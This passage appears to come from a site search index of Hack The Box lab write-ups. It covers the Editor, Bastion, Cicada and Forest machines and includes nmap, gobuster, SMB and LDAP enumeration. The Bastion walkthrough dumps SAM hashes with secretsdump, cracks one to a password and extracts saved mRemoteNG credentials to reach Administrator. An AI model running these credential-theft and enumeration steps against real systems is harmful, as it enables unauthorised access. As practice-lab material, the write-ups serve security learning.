/xwiki/bin/deleteversions/ \n| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ \n|_/xwiki/bin/undelete/\n| http-title: XWiki - Main - Intro\n|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.36 seconds\n</code></pre> <p>Discovered two web services, one on port 80 and another on port 8080. The one on port 8080 seems to be running XWiki.</p>"},{"location":"htb/labs/easy/Editor-active/#port-80","title":"Port 80","text":"<p>Navigating to the web page, we see a landing page for \"Editor - SimplistCode Pro\". </p> <p>Tried some common paths, but nothing interesting was found.</p>"},{"location":"htb/labs/easy/Editor-active/#port-8080","title":"Port 8080","text":"<p>Navigating to the web page, we see an XWiki instance.</p> <p></p>"},{"location":"htb/labs/easy/Editor-active/#subdomain-enumeration","title":"Subdomain Enumeration","text":"<pre><code>gobuster dir -u http://editor.htb:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 0\n===============================================================\nGobuster v3.8\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://editor.htb:8080\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] Exclude Length:          0\n[+] User Agent:              gobuster/3.8\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/robots.txt           (Status: 200) [Size: 1842]\nProgress: 4746 / 4746 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> Found a robots.txt file. <pre><code>curl http://editor.htb:8080/robots.txt\ncurl http://editor.htb:8080/robots.txt\n\nUser-agent: *\n# Prevent bots from executing all actions except \"view\" and\n# \"download\" since:\n# 1) we don't want bots to execute stuff in the wiki by\n#    following links! (for example delete pages, add comments,\n#    etc)\n# 2) we don't want bots to consume CPU and memory\n#   (for example to perform exports)\nDisallow: /xwiki/bin/viewattachrev/\nDisallow: /xwiki/bin/viewrev/\nDisallow: /xwiki/bin/pdf/\nDisallow: /xwiki/bin/edit/\nDisallow: /xwiki/bin/create/\nDisallow: /xwiki/bin/inline/\nDisallow: /xwiki/bin/preview/\nDisallow: /xwiki/bin/save/\nDisallow: /xwiki/bin/saveandcontinue/\nDisallow: /xwiki/bin/rollback/\nDisallow: /xwiki/bin/deleteversions/\nDisallow: /xwiki/bin/cancel/\nDisallow: /xwiki/bin/delete/\nDisallow: /xwiki/bin/deletespace/\nDisallow: /xwiki/bin/undelete/\nDisallow: /xwiki/bin/reset/\nDisallow: /xwiki/bin/register/\nDisallow: /xwiki/bin/propupdate/\nDisallow: /xwiki/bin/propadd/\nDisallow: /xwiki/bin/propdisable/\nDisallow: /xwiki/bin/propenable/\nDisallow: /xwiki/bin/propdelete/\nDisallow: /xwiki/bin/objectadd/\nDisallow: /xwiki/bin/commentadd/\nDisallow: /xwiki/bin/commentsave/\nDisallow: /xwiki/bin/objectsync/\nDisallow: /xwiki/bin/objectremove/\nDisallow: /xwiki/bin/attach/\nDisallow: /xwiki/bin/upload/\nDisallow: /xwiki/bin/temp/\nDisallow: /xwiki/bin/downloadrev/\nDisallow: /xwiki/bin/dot/\nDisallow: /xwiki/bin/delattachment/\nDisallow: /xwiki/bin/skin/\nDisallow: /xwiki/bin/jsx/\nDisallow: /xwiki/bin/ssx/\nDisallow: /xwiki/bin/login/\nDisallow: /xwiki/bin/loginsubmit/\nDisallow: /xwiki/bin/loginerror/\nDisallow: /xwiki/bin/logout/\nDisallow: /xwiki/bin/lock/\nDisallow: /xwiki/bin/redirect/\nDisallow: /xwiki/bin/admin/\nDisallow: /xwiki/bin/export/\nDisallow: /xwiki/bin/import/\nDisallow: /xwiki/bin/get/\nDisallow: /xwiki/bin/distribution/\nDisallow: /xwiki/bin/jcaptcha/\nDisallow: /xwiki/bin/unknown/\nDisallow: /xwiki/bin/webjars/\n</code></pre>"},{"location":"htb/labs/easy/bastion-retire/","title":"Bastion retire","text":"<p>This is a writeup for the HTB machine Bastion (Retire).</p>"},{"location":"htb/labs/easy/bastion-retire/#bastion","title":"Bastion","text":"<ul> <li>IP Address: <code>10.10.10.134</code></li> <li>Difficulty: Easy</li> <li>Operating System: Windows</li> </ul> Warning <p>\"This machine is retired on HTB. You will need an active VIP subscription to access it.\"</p> <p>I will start off with a <code>nmap scan</code> to see what services are running.</p>"},{"location":"htb/labs/easy/bastion-retire/#enumeration","title":"Enumeration","text":"<pre><code>nmap -sC -sV 10.10.10.134 -Pn --unprivileged                                                                \ue0b2 \uf00c \ue0b2\nStarting Nmap 7.95 ( https://nmap.org ) at 2024-12-24 19:44 Eastern Standard Time\nNmap scan report for 10.10.10.134\nHost is up (0.13s latency).\nNot shown: 995 filtered tcp ports (no-response)\nPORT     STATE SERVICE      VERSION\n22/tcp   open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)\n| ssh-hostkey:\n|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)\n|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)\n|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds\n5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: Bastion\n|   NetBIOS computer name: BASTION\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-12-25T01:44:56+01:00\n|_clock-skew: mean: -19m58s, deviation: 34m35s, median: 0s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2024-12-25T00:44:57\n|_  start_date: 2024-12-24T20:12:40\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 45.11 seconds\n</code></pre>"},{"location":"htb/labs/easy/bastion-retire/#smb-enumeration","title":"SMB Enumeration","text":"<pre><code>\u250c\u2500(C:\\Users\\dcyberguy\\pipx\\venvs\\impacket\\Scripts)\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500(dcyberguy@PLAYROOM-WIN)\u2500\u2510\n\u2514\u2500(20:02:23)\u2500\u2500&gt; netexec smb 10.10.10.134 -u '' -p '' --shares                                                      2 \u21b5 \u2500\u2500(Tue,Dec24)\u2500\u2518\nSMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)\nSMB         10.10.10.134    445    BASTION          [+] Bastion\\'':'' (Guest)\nSMB         10.10.10.134    445    BASTION          [*] Enumerated shares\nSMB         10.10.10.134    445    BASTION          Share           Permissions     Remark\nSMB         10.10.10.134    445    BASTION          -----           -----------     ------\nSMB         10.10.10.134    445    BASTION          ADMIN$                          Remote Admin\nSMB         10.10.10.134    445    BASTION          Backups         READ,WRITE\nSMB         10.10.10.134    445    BASTION          C$                              Default share\nSMB         10.10.10.134    445    BASTION          IPC$                            Remote IPC\n</code></pre> <p>Using the <code>net view</code> command to view the contents of the ALL the shares for the <code>BASTION</code> host.</p> <p></p><pre><code>\u250c\u2500(C:\\Users\\dcyberguy\\pipx\\venvs\\impacket\\Scripts)\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500(dcyberguy@PLAYROOM-WIN)\u2500\u2510\n\u2514\u2500(20:14:29)\u2500\u2500&gt; net view \\\\10.10.10.134 /all                                                                           \u2500\u2500(Tue,Dec24)\u2500\u2518\nShared resources at \\\\10.10.10.134\n\nShare name  Type  Used as  Comment\n\n-------------------------------------------------------------------------------\nADMIN$      Disk           Remote Admin\nBackups     Disk\nC$          Disk           Default share\nIPC$        IPC            Remote IPC\nThe command completed successfully.\n</code></pre> The <code>Backups</code> share is the only share that we can access. Let's connect to it and see what files are there.<p></p> <pre><code>smbclient //10.10.10.134/Backups                                                                                                        \nPassword for [WORKGROUP\\d-cyberguy]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Tue Dec 24 20:03:53 2024\n  ..                                  D        0  Tue Dec 24 20:03:53 2024\n  CquJsHSVUK.txt                      A        0  Tue Dec 24 20:03:53 2024\n  note.txt                           AR      116  Tue Apr 16 06:10:09 2019\n  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019\n  tpBJOVSnoI                          D        0  Tue Dec 24 20:03:52 2024\n  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019\n\n                5638911 blocks of size 4096. 1172070 blocks available\nsmb: \\&gt; get note.txt\ngetting file \\note.txt of size 116 as note.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)\nsmb: \\&gt; get CquJsHSVUK.txt\ngetting file \\CquJsHSVUK.txt of size 0 as CquJsHSVUK.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <p>I will use my local windows hacking machine to read the contents of the <code>WindowsImageBackup</code> file.</p> <p></p> <p>To crack the DB we need the SAM and SYSTEM hives. They are located at <code>C:\\WIndows\\System32\\config\\SAM and C:\\Windows\\System32\\config\\SYSTEM.</code></p> <p>Save them locally on your device and then run:</p> <p>I used <code>secretdumpy</code> to dump out the credentials from the SAM and SYSTEM hives.</p> <pre><code>\u250c\u2500(C:\\Users\\dcyberguy\\pipx\\venvs\\impacket\\Scripts)\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500(dcyberguy@PLAYROOM-WIN)\u2500\u2510\n\u2514\u2500(21:36:14)\u2500\u2500&gt; python secretsdump.py -sam C:\\Users\\dcyberguy\\Desktop\\SAM -system C:\\Users\\dcyberguy\\Desktop\\SYSTEM LOCAL\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nL4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::\n[*] Cleaning up...\n</code></pre> <p>If we take the NTLM hash to <code>Crackstation</code> we get: <code>bureaulampje</code></p> <p></p>"},{"location":"htb/labs/easy/bastion-retire/#getting-a-shell","title":"Getting a Shell","text":"<p>Using <code>SSH</code> to get a shell on the box. </p><pre><code>ssh l4mpje@10.10.10.134                                                                                     \ue0b2 \uf00c \ue0b2\nThe authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.\nED25519 key fingerprint is SHA256:2ZbIDKRPlngECX1WSMqnucdOWthIaPG7wQ6mBReac7M.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.134' (ED25519) to the list of known hosts.\nl4mpje@10.10.10.134's password:\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nl4mpje@BASTION C:\\Users\\L4mpje\\Desktop&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\L4mpje\\Desktop\n\n22-02-2019  15:27    &lt;DIR&gt;          .\n22-02-2019  15:27    &lt;DIR&gt;          ..\n24-12-2024  21:13                34 user.txt\n               1 File(s)             34 bytes\n               2 Dir(s)   4.732.170.240 bytes free\n\nl4mpje@BASTION C:\\Users\\L4mpje\\Desktop&gt;type user.txt\n4f618369c53e1f5aede7d039e84b5870\n</code></pre><p></p>"},{"location":"htb/labs/easy/bastion-retire/#privilege-escalation","title":"Privilege Escalation","text":"<p>Using <code>winPEAS</code> to enumerate the box for potential privilege escalation vectors. We can also see that it has the <code>mRemote Remote connection</code> tool and it's insecure credentials can be located at </p> <pre><code>l4mpje@BASTION C:\\Program Files (x86)\\mRemoteNG&gt;cd C:\\Users\\L4mpje\\AppData\\Roaming\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\L4mpje\\AppData\\Roaming\n\n22-02-2019  14:01    &lt;DIR&gt;          .\n22-02-2019  14:01    &lt;DIR&gt;          ..\n22-02-2019  13:50    &lt;DIR&gt;          Adobe\n22-02-2019  14:03    &lt;DIR&gt;          mRemoteNG\n               0 File(s)              0 bytes\n               4 Dir(s)   4.732.039.168 bytes free\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming&gt;cd mRemoteNG\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\n\n22-02-2019  14:03    &lt;DIR&gt;          .\n22-02-2019  14:03    &lt;DIR&gt;          ..\n22-02-2019  14:03             6.316 confCons.xml\n22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup\n22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup\n22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup\n22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup\n22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup\n22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup\n22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup\n22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup\n22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup\n22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup\n22-02-2019  14:03                51 extApps.xml\n25-12-2024  04:59             6.370 mRemoteNG.log\n22-02-2019  14:03             2.245 pnlLayout.xml\n22-02-2019  14:01    &lt;DIR&gt;          Themes\n              14 File(s)         77.730 bytes\n               3 Dir(s)   4.732.039.168 bytes free\n\nl4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG&gt;      \n</code></pre> <p>Let's transfer the <code>confCons.xml</code> locally, so that we can be able to obtain the administrators credentials.</p> <pre><code>scp l4mpje@10.10.10.134:\\users\\l4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xml confCons.xml                   \ue0b2 \uf071 \ue0b2\nl4mpje@10.10.10.134's password:\nconfCons.xml      \n</code></pre> <p>Now navigate to the confCons.xml file and import it. Once it\u2019s imported go to Tools &gt; External Tools. Then right-click in the white space and choose New External Tool. Next, in the External Tools Properties, fill in a Display Name, Filename and some arguments, with Password lookup,</p> <p></p> <p>Now right click on DC and click on Tools &gt; New External Tool name A prompt should appear above which the password is echoed.</p> <p></p> <p>Now that we can have the Administrator's password. Let's login as Administrator using SSH.</p> <p></p><pre><code>ssh administrator@10.10.10.134                                                                              \ue0b2 \uf00c \ue0b2\nadministrator@10.10.10.134's password:\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nadministrator@BASTION C:\\Users\\Administrator&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\Administrator\n\n25-04-2019  05:08    &lt;DIR&gt;          .\n25-04-2019  05:08    &lt;DIR&gt;          ..\n23-02-2019  09:40    &lt;DIR&gt;          Contacts\n23-02-2019  09:40    &lt;DIR&gt;          Desktop\n23-02-2019  09:40    &lt;DIR&gt;          Documents\n23-02-2019  09:40    &lt;DIR&gt;          Downloads\n23-02-2019  09:40    &lt;DIR&gt;          Favorites\n23-02-2019  09:40    &lt;DIR&gt;          Links\n23-02-2019  09:40    &lt;DIR&gt;          Music\n23-02-2019  09:40    &lt;DIR&gt;          Pictures\n23-02-2019  09:40    &lt;DIR&gt;          Saved Games\n23-02-2019  09:40    &lt;DIR&gt;          Searches\n23-02-2019  09:40    &lt;DIR&gt;          Videos\n               0 File(s)              0 bytes\n              13 Dir(s)   4.731.777.024 bytes free\n\nadministrator@BASTION C:\\Users\\Administrator&gt;\nadministrator@BASTION C:\\Users\\Administrator&gt;cd Desktop\n\nadministrator@BASTION C:\\Users\\Administrator\\Desktop&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 1B7D-E692\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n23-02-2019  09:40    &lt;DIR&gt;          .\n23-02-2019  09:40    &lt;DIR&gt;          ..\n24-12-2024  21:13                34 root.txt\n               1 File(s)             34 bytes\n               2 Dir(s)   4.731.777.024 bytes free\n\nadministrator@BASTION C:\\Users\\Administrator\\Desktop&gt;type root.txt\n65d972bb7722585f7de00a856984c1ea\n</code></pre> We have successfully rooted the box!<p></p>"},{"location":"htb/labs/easy/cicada-retire/","title":"Cicada retire","text":"<p>This is a writeup for the HTB machine Cicada (Retire).</p>"},{"location":"htb/labs/easy/cicada-retire/#cicada","title":"Cicada","text":"<ul> <li>IP Address: <code>10.10.11.35</code></li> <li>Difficulty: Easy</li> <li>Operating System: Windows</li> <li>Tags: <code>Active Directory</code>, <code>Windows</code>, <code>Enumeration</code>, <code>Privilege Escalation</code></li> </ul> Warning <p>\"This machine is retired on HTB. You will need an active VIP subscription to access it.\"</p> <p>I will start off with a <code>nmap scan</code> to see what services are running.</p>"},{"location":"htb/labs/easy/cicada-retire/#enumeration","title":"Enumeration","text":"<pre><code>nmap -sCV 10.10.11.35 -Pn                                                                                       took \uf252  5s at \uf017  05:43:08 PM\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 17:43 EDT\nNmap scan report for 10.10.11.35\nHost is up (0.10s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-19 04:43:35Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\nService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-03-19T04:44:16\n|_  start_date: N/A\n|_clock-skew: 6h59m59s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 97.03 seconds\n</code></pre> After enumerating for quite some time, I was able to use <code>Netexec</code> with the <code>Guest</code> logon to enumerate the shares of the host machine. <p>```zsh</p>"},{"location":"htb/labs/easy/forest-retire/","title":"Forest retire","text":"<p>This is a writeup for the HTB machine Forest (Retire).</p>"},{"location":"htb/labs/easy/forest-retire/#forest","title":"Forest","text":"<ul> <li>IP Address: <code>10.10.11.35</code></li> <li>Difficulty: Easy</li> <li>Operating System: Windows</li> <li>Tags: <code>Active Directory</code>, <code>Windows</code>, <code>LDAP</code>, <code>Bloodhound</code>, <code>Psexec</code>, <code>PowerView</code>, <code>SecretDump</code></li> </ul> Warning <p>\"This machine is retired on HTB. You will need an active VIP subscription to access it.\"</p> <p>I will start off with a <code>nmap scan</code> to see what services are running.</p>"},{"location":"htb/labs/easy/forest-retire/#enumeration","title":"Enumeration","text":"<pre><code>nmap -sCV 10.10.10.161                                                                       at \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 18:56 EDT\nNmap scan report for 10.10.10.161\nHost is up (0.10s latency).\nNot shown: 989 closed tcp ports (conn-refused)\nPORT     STATE SERVICE      VERSION\n53/tcp   open  domain       Simple DNS Plus\n88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-17 23:04:45Z)\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: FOREST\n|   NetBIOS computer name: FOREST\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: FOREST.htb.local\n|_  System time: 2025-03-17T16:04:55-07:00\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_clock-skew: mean: 2h27m52s, deviation: 4h02m31s, median: 7m51s\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-time:\n|   date: 2025-03-17T23:04:52\n|_  start_date: 2025-03-17T23:02:24\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 41.12 seconds\n</code></pre> <p>Using <code>ldapsearch</code> I was able to enumerate the ldap server anonymously </p><pre><code>ldapsearch -x -s sub -b \"dc=htb,dc=local\" -H ldap://10.10.10.161 \"(objectClass=*)\" \"*\" +\n</code></pre><p></p> <p>Using windapsearch I found 28 users using the <code>-U</code> flag for users </p><pre><code>\uf306 \uf07c  ~/To/windapsearch on \uf113  \uf126 master \u276f ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U        took \uf252  19s at \uf017  10:56:49 PM\n[+] No username provided. Will try anonymous bind.\n[+] Using Domain Controller at: 10.10.10.161\n[+] Getting defaultNamingContext from Root DSE\n[+]     Found: DC=htb,DC=local\n[+] Attempting bind\n[+]     ...success! Binded as:\n[+]      None\n\n[+] Enumerating all AD users\n[+]     Found 28 users:\n\ncn: Guest\n\ncn: DefaultAccount\n\ncn: Exchange Online-ApplicationAccount\nuserPrincipalName: Exchange_Online-ApplicationAccount@htb.local\n\ncn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}\nuserPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local\n\ncn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}\nuserPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local\n\ncn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}\nuserPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local\n\ncn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}\nuserPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local\n\ncn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136\nuserPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local\n\ncn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042\nuserPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local\n\ncn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}\nuserPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local\n\ncn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}\nuserPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local\n\ncn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\nuserPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local\n\ncn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe\nuserPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local\n\ncn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50\nuserPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local\n\ncn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5\nuserPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local\n\ncn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8\nuserPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local\n\ncn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba\nuserPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local\n\ncn: HealthMailbox6ded67848a234577a1756e072081d01f\nuserPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local\n\ncn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab\nuserPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local\n\ncn: HealthMailboxfd87238e536e49e08738480d300e3772\nuserPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local\n\ncn: HealthMailboxb01ac647a64648d2a5fa21df27058a24\nuserPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local\n\ncn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf\nuserPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local\n\ncn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e\nuserPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local\n\ncn: Sebastien Caron\nuserPrincipalName: sebastien@htb.local\n\ncn: Lucinda Berger\nuserPrincipalName: lucinda@htb.local\n\ncn: Andy Hislip\nuserPrincipalName: andy@htb.local\n\ncn: Mark Brandt\nuserPrincipalName: mark@htb.local\n\ncn: Santi Rodriguez\nuserPrincipalName: santi@htb.local\n\n\n[*] Bye!\n</code></pre><p></p> <p>Checking for <code>serviceaccounts</code> I found a service acount using the ``--custom \"objectClass=* \"</p> <pre><code>\uf306 \uf07c  ~/Tools/windapsearch on \uf113  \uf126 master \u276f ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom \"objectClass=*\"\n[+] No username provided. Will try anonymous bind.\n[+] 